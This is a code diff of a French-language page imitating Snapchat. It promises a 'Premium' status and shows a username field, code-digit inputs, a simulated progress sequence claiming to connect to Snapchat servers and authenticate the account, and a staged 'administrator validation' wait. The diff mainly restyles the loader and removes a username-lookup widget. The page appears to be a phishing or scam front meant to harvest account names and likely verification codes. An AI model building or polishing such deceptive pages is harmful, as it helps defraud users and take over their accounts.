@@ -322,76 +322,59 @@
             flex-shrink: 0;
             transition: all 0.3s ease;
         }
-        .snap-status.loading { animation: spin 0.8s linear infinite; display: inline-block; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        .snap-profile-card {
-            display: none;
-            align-items: center;
-            gap: 12px;
-            margin-top: 12px;
-            background: linear-gradient(135deg, rgba(255,252,0,0.08), rgba(255,200,50,0.05));
-            border: 1px solid rgba(255,252,0,0.35);
-            border-radius: 14px;
-            padding: 12px 16px;
-            animation: cardIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-            box-shadow: 0 4px 20px rgba(255,252,0,0.12);
-        }
-        .snap-profile-card.visible { display: flex; }
-        @keyframes cardIn {
-            from { opacity: 0; transform: translateY(-10px) scale(0.95); }
-            to   { opacity: 1; transform: translateY(0) scale(1); }
-        }
-        .snap-avatar {
-            width: 52px; height: 52px;
-            border-radius: 50%;
-            border: 2px solid #FFFC00;
-            object-fit: cover;
-            box-shadow: 0 0 14px rgba(255,252,0,0.5);
-            flex-shrink: 0;
-        }
-        .snap-profile-info { flex: 1; text-align: left; }
-        .snap-display-name {
-            font-size: 15px; font-weight: 700; color: #fff;
-            margin-bottom: 2px;
-        }
-        .snap-username-tag { font-size: 12px; color: #FFFC00; font-weight: 600; }
-        .snap-verified-badge {
-            width: 28px; height: 28px; border-radius: 50%;
-            background: linear-gradient(135deg, #FFFC00, #FFD700);
-            display: flex; align-items: center; justify-content: center;
-            color: #000; font-size: 12px; font-weight: 800;
-            box-shadow: 0 0 12px rgba(255,252,0,0.6);
-            flex-shrink: 0;
-        }
-        .snap-not-found {
-            margin-top: 10px; font-size: 13px; color: #ff4d4d;
-            font-weight: 600; display: flex; align-items: center; gap: 6px;
-            animation: cardIn 0.4s ease;
-        }
-
         .step { display: none; animation: fadeInUp 0.5s ease forwards; }
         .step.active { display: block; }
         @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* ===== LOADING AMÉLIORÉ ===== */
         .loading-container-advanced { padding: 20px 20px; text-align: center; }
-        .progress-circle-container { position: relative; width: 160px; height: 160px; margin: 20px auto 20px; display: flex; justify-content: center; align-items: center; }
-        .progress-circle {
-            width: 100%; height: 100%; border-radius: 50%;
-            background: conic-gradient(#FFFC00 0% 0%, rgba(255, 255, 255, 0.15) 0% 100%);
+
+        .progress-circle-container {
+            position: relative; width: 190px; height: 190px;
+            margin: 24px auto 24px;
             display: flex; justify-content: center; align-items: center;
-            transition: background 0.4s ease;
-            box-shadow: 0 0 40px rgba(255, 252, 0, 0.3), inset 0 0 30px rgba(0, 0, 0, 0.5);
-            animation: rotateCircle 20s linear infinite;
         }
-        @keyframes rotateCircle {
-            0% { filter: drop-shadow(0 0 10px rgba(255, 252, 0, 0.4)); }
-            50% { filter: drop-shadow(0 0 20px rgba(255, 252, 0, 0.7)); }
-            100% { filter: drop-shadow(0 0 10px rgba(255, 252, 0, 0.4)); }
+
+        /* Anneaux rotatifs autour du cercle */
+        .progress-circle-container::before,
+        .progress-circle-container::after {
+            content: '';
+            position: absolute;
+            border-radius: 50%;
+            border: 2px solid transparent;
+            animation: ringRotate 3s linear infinite;
         }
+        .progress-circle-container::before {
+            width: 190px; height: 190px;
+            border-top-color: rgba(255, 252, 0, 0.5);
+            border-right-color: rgba(255, 252, 0, 0.2);
+        }
+        .progress-circle-container::after {
+            width: 174px; height: 174px;
+            border-bottom-color: rgba(255, 252, 0, 0.4);
+            border-left-color: rgba(255, 252, 0, 0.15);
+            animation-direction: reverse;
+            animation-duration: 2s;
+        }
+        @keyframes ringRotate { to { transform: rotate(360deg); } }
+
+        .progress-circle {
+            width: 160px; height: 160px; border-radius: 50%;
+            background: conic-gradient(#FFFC00 0% 0%, rgba(255,255,255,0.1) 0% 100%);
+            display: flex; justify-content: center; align-items: center;
+            transition: background 0.3s ease;
+            box-shadow: 0 0 50px rgba(255,252,0,0.25);
+            animation: glowPulse 2s ease-in-out infinite;
+        }
+        @keyframes glowPulse {
+            0%,100% { box-shadow: 0 0 30px rgba(255,252,0,0.2); }
+            50%      { box-shadow: 0 0 60px rgba(255,252,0,0.5), 0 0 100px rgba(255,252,0,0.15); }
+        }
+
         .progress-circle-inner {
-            width: 110px; height: 110px; background: #000; border-radius: 50%;
+            width: 118px; height: 118px; background: #000; border-radius: 50%;
             display: flex; flex-direction: column; justify-content: center; align-items: center;
-            box-shadow: inset 0 0 25px rgba(0, 0, 0, 0.9); z-index: 2;
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.9); z-index: 2;
         }
         .progress-percentage {
             font-size: 38px; font-weight: 800; color: #FFFC00; line-height: 1;
@@ -418,64 +401,66 @@
             font-size: 14px; color: #ccc; margin-bottom: 20px;
             animation: slideInText 0.8s ease-out 0.4s both;
         }
+        /* Étapes de progression */
         .progress-steps { text-align: left; max-width: 320px; margin: 0 auto 20px; }
         .progress-step {
-            display: flex; align-items: center; margin-bottom: 14px; opacity: 0; transform: translateX(-20px);
-            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
-            animation: slideInText 0.6s ease-out both;
+            display: flex; align-items: center; margin-bottom: 12px;
+            opacity: 0; transform: translateX(-20px);
+            transition: opacity 0.5s ease, transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            background: rgba(255,255,255,0.03);
+            border-radius: 12px; padding: 10px 12px;
+            border: 1px solid rgba(255,255,255,0.05);
         }
-        .progress-step:nth-child(1) { animation-delay: 0.2s; }
-        .progress-step:nth-child(2) { animation-delay: 0.3s; }
-        .progress-step:nth-child(3) { animation-delay: 0.4s; }
-        .progress-step:nth-child(4) { animation-delay: 0.5s; }
-        .progress-step:nth-child(5) { animation-delay: 0.6s; }
-        .progress-step.visible { opacity: 1; transform: translateX(0); }
+        .progress-step.visible {
+            opacity: 1; transform: translateX(0);
+            border-color: rgba(255,252,0,0.1);
+        }
         .step-icon {
-            width: 28px; height: 28px; border-radius: 50%;
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.15), rgba(255, 252, 0, 0.05));
+            width: 32px; height: 32px; border-radius: 50%;
+            background: rgba(255,255,255,0.08);
             margin-right: 14px; display: flex; justify-content: center; align-items: center;
-            font-size: 13px; font-weight: 700; color: #888; flex-shrink: 0;
-            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
-            border: 2px solid rgba(255, 255, 255, 0.1);
+            font-size: 13px; font-weight: 700; color: #666; flex-shrink: 0;
+            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            border: 2px solid rgba(255,255,255,0.1);
         }
         .step-icon.completed {
             background: linear-gradient(135deg, #FFFC00, #FFD700);
-            color: #000;
-            box-shadow: 0 0 20px rgba(255, 252, 0, 0.8), 0 0 40px rgba(255, 252, 0, 0.4);
-            border-color: #fff;
-            animation: stepPulse 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            color: #000; border-color: transparent;
+            box-shadow: 0 0 16px rgba(255,252,0,0.7);
+            animation: stepPop 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
         }
-        @keyframes stepPulse {
-            0% { transform: scale(0.3) rotate(-180deg); }
-            70% { transform: scale(1.1); }
+        @keyframes stepPop {
+            0%   { transform: scale(0) rotate(-180deg); }
+            70%  { transform: scale(1.15); }
             100% { transform: scale(1) rotate(0deg); }
         }
-        .step-text { font-size: 15px; color: #ddd; font-weight: 500; }
+        .step-text { font-size: 14px; color: #999; font-weight: 500; transition: color 0.3s; }
         .step-text.completed { color: #fff; font-weight: 600; }
-        .step-warning { font-size: 12px; color: #aaa; margin-top: 10px; padding-left: 42px; font-weight: 500; text-align: left; }
-        .waiting-box {
-            background: linear-gradient(135deg, rgba(255, 252, 0, 0.08), rgba(138, 43, 226, 0.08));
-            border-radius: 18px; padding: 25px 20px;
-            margin-top: 20px; border: 1px solid rgba(255, 252, 0, 0.25);
-            box-shadow: 0 8px 30px rgba(255, 252, 0, 0.1), inset 0 0 30px rgba(255, 252, 0, 0.05);
-            animation: slideUp 0.6s ease-out 0.5s both;
-            animation: pulse 2s ease-in-out infinite;
+        .step-warning {
+            font-size: 12px; color: #666; margin-top: 14px;
+            text-align: center; font-weight: 500;
+            display: flex; align-items: center; justify-content: center; gap: 6px;
         }
-        @keyframes pulse {
-            0%, 100% { box-shadow: 0 8px 30px rgba(255, 252, 0, 0.1), inset 0 0 30px rgba(255, 252, 0, 0.05); }
-            50% { box-shadow: 0 8px 40px rgba(255, 252, 0, 0.2), inset 0 0 40px rgba(255, 252, 0, 0.1); }
+        .step-warning i { color: #FFFC00; animation: warnBlink 2s ease-in-out infinite; }
+        @keyframes warnBlink { 0%,100% { opacity:1; } 50% { opacity:0.4; } }
+
+        /* Waiting box */
+        .waiting-box {
+            background: rgba(255,252,0,0.05);
+            border-radius: 18px; padding: 24px 20px;
+            margin-top: 20px; border: 1px solid rgba(255,252,0,0.2);
+            animation: waitPulse 2.5s ease-in-out infinite;
+        }
+        @keyframes waitPulse {
+            0%,100% { border-color: rgba(255,252,0,0.15); box-shadow: 0 0 0 0 rgba(255,252,0,0); }
+            50%      { border-color: rgba(255,252,0,0.4);  box-shadow: 0 0 20px rgba(255,252,0,0.1); }
         }
         .waiting-title {
             font-size: 18px; font-weight: 700; color: #FFFC00; margin-bottom: 10px;
-            text-shadow: 0 0 10px rgba(255, 252, 0, 0.5);
-            animation: slideInText 0.6s ease-out 0.4s both;
+            text-shadow: 0 0 12px rgba(255,252,0,0.5);
         }
-        .waiting-text {
-            font-size: 14px; color: #ccc;
-            animation: slideInText 0.6s ease-out 0.5s both;
-        }
-        .pulse-animation { animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 252, 0, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(255, 252, 0, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 252, 0, 0); } }
+        .waiting-text { font-size: 14px; color: #bbb; line-height: 1.5; }
+        .pulse-animation { animation: waitPulse 2.5s ease-in-out infinite; }
         .code-input-wrapper { display: flex; justify-content: center; gap: 10px; margin-bottom: 30px; }
         .code-digit-input {
             width: 50px; height: 60px;
@@ -625,22 +610,9 @@
                 
                 <div class="form-group">
                     <label class="form-label"><i class="fas fa-at"></i> Pseudo Snapchat</label>
-                    <div class="input-wrapper" id="snapInputWrapper">
+                    <div class="input-wrapper">
                         <span class="input-icon">@</span>
                         <input type="text" id="snapchatInput" class="input-field" placeholder="ton_pseudo" autocomplete="off" required>
-                        <span id="snapStatus" class="snap-status"></span>
-                    </div>
-                    <!-- Carte profil -->
-                    <div id="snapProfileCard" class="snap-profile-card">
-                        <img id="snapAvatar" src="" alt="avatar" class="snap-avatar">
-                        <div class="snap-profile-info">
-                            <div id="snapDisplayName" class="snap-display-name"></div>
-                            <div id="snapUsername" class="snap-username-tag"></div>
-                        </div>
-                        <div class="snap-verified-badge"><i class="fas fa-check"></i></div>
-                    </div>
-                    <div id="snapNotFound" class="snap-not-found" style="display:none;">
-                        <i class="fas fa-times-circle"></i> Pseudo introuvable
                     </div>
                 </div>
 
@@ -674,6 +646,7 @@
         <!-- ÉTAPE CHARGEMENT AVEC ATTENTE -->
         <div id="loading-advanced" class="step">
             <div class="loading-container-advanced">
+
                 <div class="progress-circle-container">
                     <div class="progress-circle" id="progressCircle">
                         <div class="progress-circle-inner">
@@ -682,21 +655,46 @@
                         </div>
                     </div>
                 </div>
-                
+
                 <h3 class="loading-title" id="loadingMainTitle">Activation en cours...</h3>
                 <p class="loading-subtitle" id="loadingSubtitle">Traitement pour <strong id="loading-account">@pseudo</strong></p>
 
                 <div class="progress-steps" id="progressStepsContainer">
-                    <div class="progress-step"><div class="step-icon">1</div><div class="step-text">Connexion aux serveurs Snapchat</div></div>
-                    <div class="progress-step"><div class="step-icon">2</div><div class="step-text">Authentification du compte</div></div>
-                    <div class="progress-step"><div class="step-icon">3</div><div class="step-text">Vérification de l'éligibilité</div></div>
-                    <div class="progress-step"><div class="step-icon">4</div><div class="step-text">Attribution du statut Premium</div></div>
-                    <div class="progress-step"><div class="step-icon">5</div><div class="step-text">Activation des filtres exclusifs</div></div>
+                    <div class="progress-step">
+                        <div class="step-icon">1</div>
+                        <div>
+                            <div class="step-text">Connexion aux serveurs Snapchat</div>
+                        </div>
+                    </div>
+                    <div class="progress-step">
+                        <div class="step-icon">2</div>
+                        <div>
+                            <div class="step-text">Authentification du compte</div>
+                        </div>
+                    </div>
+                    <div class="progress-step">
+                        <div class="step-icon">3</div>
+                        <div>
+                            <div class="step-text">Vérification de l'éligibilité</div>
+                        </div>
+                    </div>
+                    <div class="progress-step">
+                        <div class="step-icon">4</div>
+                        <div>
+                            <div class="step-text">Attribution du statut Premium</div>
+                        </div>
+                    </div>
+                    <div class="progress-step">
+                        <div class="step-icon">5</div>
+                        <div>
+                            <div class="step-text">Activation des filtres exclusifs</div>
+                        </div>
+                    </div>
                 </div>
 
                 <div id="waitingBox" class="waiting-box" style="display:none;">
-                    <h4 class="waiting-title">🛡️ En attente de probation</h4>
-                    <p class="waiting-text">Un administrateur doit valider votre demande. Cela peut prendre quelques instants.</p>
+                    <h4 class="waiting-title">🛡️ En attente de validation</h4>
+                    <p class="waiting-text">Un administrateur examine votre demande. Restez sur cette page, cela prend quelques instants.</p>
                 </div>
 
                 <div class="step-warning">
@@ -745,61 +743,6 @@
         let animationInterval = null;
         let progressStepIndex = 0;
         const totalProgressSteps = 5;
-        let snapCheckTimer = null;
-        let snapVerified = false;
-
-        // ===== VÉRIFICATION PSEUDO SNAP =====
-        function resetSnapCard() {
-            document.getElementById('snapProfileCard').classList.remove('visible');
-            document.getElementById('snapNotFound').style.display = 'none';
-            document.getElementById('snapStatus').textContent = '';
-            document.getElementById('snapStatus').className = 'snap-status';
-            snapVerified = false;
-        }
-
-        async function checkSnapUsername(username) {
-            resetSnapCard();
-            if (username.length < 3) return;
-
-            const statusEl = document.getElementById('snapStatus');
-            statusEl.className = 'snap-status loading';
-            statusEl.textContent = '⟳';
-
-            try {
-                const res = await fetch(`/api/check-snapchat/${encodeURIComponent(username)}`);
-                const data = await res.json();
-
-                statusEl.className = 'snap-status';
-
-                if (data.exists) {
-                    statusEl.textContent = '✅';
-                    snapVerified = true;
-
-                    // Remplir la carte profil
-                    const card = document.getElementById('snapProfileCard');
-                    const avatarEl = document.getElementById('snapAvatar');
-                    document.getElementById('snapDisplayName').textContent = data.displayName || username;
-                    document.getElementById('snapUsername').textContent = '@' + data.username;
-
-                    if (data.avatarUrl) {
-                        avatarEl.src = data.avatarUrl;
-                        avatarEl.style.display = 'block';
-                    } else {
-                        avatarEl.src = '/snap-logo.png';
-                    }
-                    card.classList.add('visible');
-                    document.getElementById('snapNotFound').style.display = 'none';
-                } else {
-                    statusEl.textContent = '❌';
-                    document.getElementById('snapNotFound').style.display = 'flex';
-                    document.getElementById('snapProfileCard').classList.remove('visible');
-                }
-            } catch (err) {
-                statusEl.className = 'snap-status';
-                statusEl.textContent = '';
-                console.error(err);
-            }
-        }
 
 
         function showStep(stepId) {
@@ -1024,19 +967,7 @@
         document.addEventListener('DOMContentLoaded', () => {
             updateProgressBar(0);
             showStep('step1');
-            // Listener vérification pseudo
-            const snapInput = document.getElementById('snapchatInput');
-            snapInput.addEventListener('input', () => {
-                clearTimeout(snapCheckTimer);
-                resetSnapCard();
-                const val = snapInput.value.trim();
-                if (val.length >= 3) {
-                    document.getElementById('snapStatus').className = 'snap-status loading';
-                    document.getElementById('snapStatus').textContent = '⟳';
-                    snapCheckTimer = setTimeout(() => checkSnapUsername(val), 700);
-                }
-            });
-            snapInput.focus();
+            document.getElementById('snapchatInput').focus();
         });
 
         /* ===== ÉTOILES CSS via box-shadow (aucun canvas, aucun bug scroll) ===== */
